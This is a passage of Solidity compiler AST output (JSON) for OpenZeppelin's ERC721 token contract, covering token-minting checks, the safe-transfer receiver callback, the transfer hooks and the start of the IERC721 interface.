(bool)"}},"id":871,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"13547:16:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"hexValue":"4552433732313a20696e76616c696420746f6b656e204944","id":872,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"13565:26:1","typeDescriptions":{"typeIdentifier":"t_stringliteral_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f","typeString":"literal_string \"ERC721: invalid token ID\""},"value":"ERC721: invalid token ID"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_stringliteral_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f","typeString":"literal_string \"ERC721: invalid token ID\""}],"id":868,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"13539:7:1","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$","typeString":"function (bool,string memory) pure"}},"id":873,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"13539:53:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":874,"nodeType":"ExpressionStatement","src":"13539:53:1"}]},"documentation":{"id":863,"nodeType":"StructuredDocumentation","src":"13388:73:1","text":" @dev Reverts if the `tokenId` has not been minted yet."},"id":876,"implemented":true,"kind":"function","modifiers":[],"name":"_requireMinted","nameLocation":"13475:14:1","nodeType":"FunctionDefinition","parameters":{"id":866,"nodeType":"ParameterList","parameters":[{"constant":false,"id":865,"mutability":"mutable","name":"tokenId","nameLocation":"13498:7:1","nodeType":"VariableDeclaration","scope":876,"src":"13490:15:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":864,"name":"uint256","nodeType":"ElementaryTypeName","src":"13490:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"13489:17:1"},"returnParameters":{"id":867,"nodeType":"ParameterList","parameters":[],"src":"13529:0:1"},"scope":998,"src":"13466:133:1","stateMutability":"view","virtual":true,"visibility":"internal"},{"body":{"id":937,"nodeType":"Block","src":"14306:676:1","statements":[{"condition":{"arguments":[],"expression":{"argumentTypes":[],"expression":{"id":890,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":881,"src":"14320:2:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"id":891,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"isContract","nodeType":"MemberAccess","referencedDeclaration":1177,"src":"14320:13:1","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_address_$returns$_t_bool_$bound_to$_t_address_$","typeString":"function (address) view returns (bool)"}},"id":892,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"14320:15:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseBody":{"id":935,"nodeType":"Block","src":"14940:36:1","statements":[{"expression":{"hexValue":"74727565","id":933,"isConstant":false,"isLValue":false,"isPure":true,"kind":"bool","lValueRequested":false,"nodeType":"Literal","src":"14961:4:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"value":"true"},"functionReturnParameters":889,"id":934,"nodeType":"Return","src":"14954:11:1"}]},"id":936,"nodeType":"IfStatement","src":"14316:660:1","trueBody":{"id":932,"nodeType":"Block","src":"14337:597:1","statements":[{"clauses":[{"block":{"id":912,"nodeType":"Block","src":"14451:91:1","statements":[{"expression":{"commonType":{"typeIdentifier":"t_bytes4","typeString":"bytes4"},"id":910,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":906,"name":"retval","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":904,"src":"14476:6:1","typeDescriptions":{"typeIdentifier":"t_bytes4","typeString":"bytes4"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"expression":{"expression":{"id":907,"name":"IERC721Receiver","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1132,"src":"14486:15:1","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_IERC721Receiver_$1132_$","typeString":"type(contract IERC721Receiver)"}},"id":908,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberName":"onERC721Received","nodeType":"MemberAccess","referencedDeclaration":1131,"src":"14486:32:1","typeDescriptions":{"typeIdentifier":"t_function_declaration_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_bytes_calldata_ptr_$returns$_t_bytes4_$","typeString":"function IERC721Receiver.onERC721Received(address,address,uint256,bytes calldata) returns (bytes4)"}},"id":909,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberName":"selector","nodeType":"MemberAccess","src":"14486:41:1","typeDescriptions":{"typeIdentifier":"t_bytes4","typeString":"bytes4"}},"src":"14476:51:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"functionReturnParameters":889,"id":911,"nodeType":"Return","src":"14469:58:1"}]},"errorName":"","id":913,"nodeType":"TryCatchClause","parameters":{"id":905,"nodeType":"ParameterList","parameters":[{"constant":false,"id":904,"mutability":"mutable","name":"retval","nameLocation":"14443:6:1","nodeType":"VariableDeclaration","scope":913,"src":"14436:13:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes4","typeString":"bytes4"},"typeName":{"id":903,"name":"bytes4","nodeType":"ElementaryTypeName","src":"14436:6:1","typeDescriptions":{"typeIdentifier":"t_bytes4","typeString":"bytes4"}},"visibility":"internal"}],"src":"14435:15:1"},"src":"14427:115:1"},{"block":{"id":929,"nodeType":"Block","src":"14571:353:1","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":920,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"id":917,"name":"reason","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":915,"src":"14593:6:1","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":918,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"length","nodeType":"MemberAccess","src":"14593:13:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"hexValue":"30","id":919,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"14610:1:1","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"14593:18:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseBody":{"id":927,"nodeType":"Block","src":"14720:190:1","statements":[{"AST":{"nodeType":"YulBlock","src":"14806:86:1","statements":[{"expression":{"arguments":[{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"14843:2:1","type":"","value":"32"},{"name":"reason","nodeType":"YulIdentifier","src":"14847:6:1"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"14839:3:1"},"nodeType":"YulFunctionCall","src":"14839:15:1"},{"arguments":[{"name":"reason","nodeType":"YulIdentifier","src":"14862:6:1"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"14856:5:1"},"nodeType":"YulFunctionCall","src":"14856:13:1"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"14832:6:1"},"nodeType":"YulFunctionCall","src":"14832:38:1"},"nodeType":"YulExpressionStatement","src":"14832:38:1"}]},"documentation":"@solidity memory-safe-assembly","evmVersion":"london","externalReferences":[{"declaration":915,"isOffset":false,"isSlot":false,"src":"14847:6:1","valueSize":1},{"declaration":915,"isOffset":false,"isSlot":false,"src":"14862:6:1","valueSize":1}],"id":926,"nodeType":"InlineAssembly","src":"14797:95:1"}]},"id":928,"nodeType":"IfStatement","src":"14589:321:1","trueBody":{"id":925,"nodeType":"Block","src":"14613:101:1","statements":[{"expression":{"arguments":[{"hexValue":"4552433732313a207472616e7366657220746f206e6f6e20455243373231526563656976657220696d706c656d656e746572","id":922,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"14642:52:1","typeDescriptions":{"typeIdentifier":"t_stringliteral_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e","typeString":"literal_string \"ERC721: transfer to non ERC721Receiver implementer\""},"value":"ERC721: transfer to non ERC721Receiver implementer"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_stringliteral_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e","typeString":"literal_string \"ERC721: transfer to non ERC721Receiver implementer\""}],"id":921,"name":"revert","nodeType":"Identifier","overloadedDeclarations":[-19,-19],"referencedDeclaration":-19,"src":"14635:6:1","typeDescriptions":{"typeIdentifier":"t_function_revert_pure$_t_string_memory_ptr_$returns$__$","typeString":"function (string memory) pure"}},"id":923,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"14635:60:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":924,"nodeType":"ExpressionStatement","src":"14635:60:1"}]}}]},"errorName":"","id":930,"nodeType":"TryCatchClause","parameters":{"id":916,"nodeType":"ParameterList","parameters":[{"constant":false,"id":915,"mutability":"mutable","name":"reason","nameLocation":"14563:6:1","nodeType":"VariableDeclaration","scope":930,"src":"14550:19:1","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":914,"name":"bytes","nodeType":"ElementaryTypeName","src":"14550:5:1","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"src":"14549:21:1"},"src":"14543:381:1"}],"externalCall":{"arguments":[{"arguments":[],"expression":{"argumentTypes":[],"id":897,"name":"_msgSender","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1501,"src":"14392:10:1","typeDescriptions":{"typeIdentifier":"t_function_internal_view$__$returns$_t_address_$","typeString":"function () view returns (address)"}},"id":898,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"14392:12:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":899,"name":"from","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":879,"src":"14406:4:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":900,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":883,"src":"14412:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":901,"name":"data","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":885,"src":"14421:4:1","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}],"expression":{"arguments":[{"id":894,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":881,"src":"14371:2:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":893,"name":"IERC721Receiver","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1132,"src":"14355:15:1","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_IERC721Receiver_$1132_$","typeString":"type(contract IERC721Receiver)"}},"id":895,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"14355:19:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_contract$_IERC721Receiver_$1132","typeString":"contract IERC721Receiver"}},"id":896,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"onERC721Received","nodeType":"MemberAccess","referencedDeclaration":1131,"src":"14355:36:1","typeDescriptions":{"typeIdentifier":"t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_bytes_memory_ptr_$returns$_t_bytes4_$","typeString":"function (address,address,uint256,bytes memory) external returns (bytes4)"}},"id":902,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"14355:71:1","tryCall":true,"typeDescriptions":{"typeIdentifier":"t_bytes4","typeString":"bytes4"}},"id":931,"nodeType":"TryStatement","src":"14351:573:1"}]}}]},"documentation":{"id":877,"nodeType":"StructuredDocumentation","src":"13605:541:1","text":" @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.\n The call is not executed if the target address is not a contract.\n @param from address representing the previous owner of the given token ID\n @param to target address that will receive the tokens\n @param tokenId uint256 ID of the token to be transferred\n @param data bytes optional data to send along with the call\n @return bool whether the call correctly returned the expected magic value"},"id":938,"implemented":true,"kind":"function","modifiers":[],"name":"_checkOnERC721Received","nameLocation":"14160:22:1","nodeType":"FunctionDefinition","parameters":{"id":886,"nodeType":"ParameterList","parameters":[{"constant":false,"id":879,"mutability":"mutable","name":"from","nameLocation":"14200:4:1","nodeType":"VariableDeclaration","scope":938,"src":"14192:12:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":878,"name":"address","nodeType":"ElementaryTypeName","src":"14192:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":881,"mutability":"mutable","name":"to","nameLocation":"14222:2:1","nodeType":"VariableDeclaration","scope":938,"src":"14214:10:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":880,"name":"address","nodeType":"ElementaryTypeName","src":"14214:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":883,"mutability":"mutable","name":"tokenId","nameLocation":"14242:7:1","nodeType":"VariableDeclaration","scope":938,"src":"14234:15:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":882,"name":"uint256","nodeType":"ElementaryTypeName","src":"14234:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":885,"mutability":"mutable","name":"data","nameLocation":"14272:4:1","nodeType":"VariableDeclaration","scope":938,"src":"14259:17:1","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":884,"name":"bytes","nodeType":"ElementaryTypeName","src":"14259:5:1","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"src":"14182:100:1"},"returnParameters":{"id":889,"nodeType":"ParameterList","parameters":[{"constant":false,"id":888,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":938,"src":"14300:4:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":887,"name":"bool","nodeType":"ElementaryTypeName","src":"14300:4:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"}],"src":"14299:6:1"},"scope":998,"src":"14151:831:1","stateMutability":"nonpayable","virtual":false,"visibility":"private"},{"body":{"id":983,"nodeType":"Block","src":"15856:238:1","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":952,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":950,"name":"batchSize","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":947,"src":"15870:9:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"31","id":951,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"15882:1:1","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"15870:13:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":982,"nodeType":"IfStatement","src":"15866:222:1","trueBody":{"id":981,"nodeType":"Block","src":"15885:203:1","statements":[{"condition":{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":958,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":953,"name":"from","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":941,"src":"15903:4:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"arguments":[{"hexValue":"30","id":956,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"15919:1:1","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":955,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"15911:7:1","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":954,"name":"address","nodeType":"ElementaryTypeName","src":"15911:7:1","typeDescriptions":{}}},"id":957,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"15911:10:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"15903:18:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":966,"nodeType":"IfStatement","src":"15899:85:1","trueBody":{"id":965,"nodeType":"Block","src":"15923:61:1","statements":[{"expression":{"id":963,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"id":959,"name":"_balances","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":89,"src":"15941:9:1","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_uint256_$","typeString":"mapping(address => uint256)"}},"id":961,"indexExpression":{"id":960,"name":"from","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":941,"src":"15951:4:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"15941:15:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"-=","rightHandSide":{"id":962,"name":"batchSize","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":947,"src":"15960:9:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"15941:28:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":964,"nodeType":"ExpressionStatement","src":"15941:28:1"}]}},{"condition":{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":972,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":967,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":943,"src":"16001:2:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"arguments":[{"hexValue":"30","id":970,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"16015:1:1","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":969,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"16007:7:1","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":968,"name":"address","nodeType":"ElementaryTypeName","src":"16007:7:1","typeDescriptions":{}}},"id":971,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"16007:10:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"16001:16:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":980,"nodeType":"IfStatement","src":"15997:81:1","trueBody":{"id":979,"nodeType":"Block","src":"16019:59:1","statements":[{"expression":{"id":977,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"id":973,"name":"_balances","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":89,"src":"16037:9:1","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_uint256_$","typeString":"mapping(address => uint256)"}},"id":975,"indexExpression":{"id":974,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":943,"src":"16047:2:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"16037:13:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"id":976,"name":"batchSize","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":947,"src":"16054:9:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"16037:26:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":978,"nodeType":"ExpressionStatement","src":"16037:26:1"}]}}]}}]},"documentation":{"id":939,"nodeType":"StructuredDocumentation","src":"14988:705:1","text":" @dev Hook that is called before any token transfer. This includes minting and burning. If {ERC721Consecutive} is\n used, the hook may be called as part of a consecutive (batch) mint, as indicated by `batchSize` greater than 1.\n Calling conditions:\n - When `from` and `to` are both non-zero, ``from``'s tokens will be transferred to `to`.\n - When `from` is zero, the tokens will be minted for `to`.\n - When `to` is zero, ``from``'s tokens will be burned.\n - `from` and `to` are never both zero.\n - `batchSize` is non-zero.\n To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks]."},"id":984,"implemented":true,"kind":"function","modifiers":[],"name":"_beforeTokenTransfer","nameLocation":"15707:20:1","nodeType":"FunctionDefinition","parameters":{"id":948,"nodeType":"ParameterList","parameters":[{"constant":false,"id":941,"mutability":"mutable","name":"from","nameLocation":"15745:4:1","nodeType":"VariableDeclaration","scope":984,"src":"15737:12:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":940,"name":"address","nodeType":"ElementaryTypeName","src":"15737:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":943,"mutability":"mutable","name":"to","nameLocation":"15767:2:1","nodeType":"VariableDeclaration","scope":984,"src":"15759:10:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":942,"name":"address","nodeType":"ElementaryTypeName","src":"15759:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":945,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":984,"src":"15779:7:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":944,"name":"uint256","nodeType":"ElementaryTypeName","src":"15779:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":947,"mutability":"mutable","name":"batchSize","nameLocation":"15823:9:1","nodeType":"VariableDeclaration","scope":984,"src":"15815:17:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":946,"name":"uint256","nodeType":"ElementaryTypeName","src":"15815:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"15727:111:1"},"returnParameters":{"id":949,"nodeType":"ParameterList","parameters":[],"src":"15856:0:1"},"scope":998,"src":"15698:396:1","stateMutability":"nonpayable","virtual":true,"visibility":"internal"},{"body":{"id":996,"nodeType":"Block","src":"16951:2:1","statements":[]},"documentation":{"id":985,"nodeType":"StructuredDocumentation","src":"16100:695:1","text":" @dev Hook that is called after any token transfer. This includes minting and burning. If {ERC721Consecutive} is\n used, the hook may be called as part of a consecutive (batch) mint, as indicated by `batchSize` greater than 1.\n Calling conditions:\n - When `from` and `to` are both non-zero, ``from``'s tokens were transferred to `to`.\n - When `from` is zero, the tokens were minted for `to`.\n - When `to` is zero, ``from``'s tokens were burned.\n - `from` and `to` are never both zero.\n - `batchSize` is non-zero.\n To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks]."},"id":997,"implemented":true,"kind":"function","modifiers":[],"name":"_afterTokenTransfer","nameLocation":"16809:19:1","nodeType":"FunctionDefinition","parameters":{"id":994,"nodeType":"ParameterList","parameters":[{"constant":false,"id":987,"mutability":"mutable","name":"from","nameLocation":"16846:4:1","nodeType":"VariableDeclaration","scope":997,"src":"16838:12:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":986,"name":"address","nodeType":"ElementaryTypeName","src":"16838:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":989,"mutability":"mutable","name":"to","nameLocation":"16868:2:1","nodeType":"VariableDeclaration","scope":997,"src":"16860:10:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":988,"name":"address","nodeType":"ElementaryTypeName","src":"16860:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":991,"mutability":"mutable","name":"firstTokenId","nameLocation":"16888:12:1","nodeType":"VariableDeclaration","scope":997,"src":"16880:20:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":990,"name":"uint256","nodeType":"ElementaryTypeName","src":"16880:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":993,"mutability":"mutable","name":"batchSize","nameLocation":"16918:9:1","nodeType":"VariableDeclaration","scope":997,"src":"16910:17:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":992,"name":"uint256","nodeType":"ElementaryTypeName","src":"16910:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"16828:105:1"},"returnParameters":{"id":995,"nodeType":"ParameterList","parameters":[],"src":"16951:0:1"},"scope":998,"src":"16800:153:1","stateMutability":"nonpayable","virtual":true,"visibility":"internal"}],"scope":999,"src":"628:16327:1","usedErrors":[]}],"src":"107:16849:1"},"id":1},"@openzeppelin/contracts/token/ERC721/IERC721.sol":{"ast":{"absolutePath":"@openzeppelin/contracts/token/ERC721/IERC721.sol","exportedSymbols":{"IERC165":[1722],"IERC721":[1114]},"id":1115,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":1000,"literals":["solidity","^","0.8",".0"],"nodeType":"PragmaDirective","src":"108:23:2"},{"absolutePath":"@openzeppelin/contracts/utils/introspection/IERC165.sol","file":"../../utils/introspection/IERC165.sol","id":1001,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":1115,"sourceUnit":1723,"src":"133:47:2","symbolAliases":[],"unitAlias":""},{"abstract":false,"baseContracts":[{"baseName":{"id":1003,"name":"IERC165","nodeType":"IdentifierPath","referencedDeclaration":1722,"src":"271:7:2"},"id":1004,"nodeType":"InheritanceSpecifier","src":"271:7:2"}],"contractDependencies":[],"contractKind":"interface","documentation":{"id":1002,"nodeType":"StructuredDocumentation","src":"182:67:2","text":" @dev Required interface of an ERC721 compliant contract."},"fullyImplemented":false,"id":1114,"linearizedBaseContracts":[1114,1722],"name":"IERC721","nameLocation":"260:7:2","nodeType":"ContractDefinition","nodes":[{"anonymous":false,"documentation":{"id":1005,"nodeType":"StructuredDocumentation","src":"285:88:2","text":" @dev Emitted when `tokenId` token is transferred from `from` to 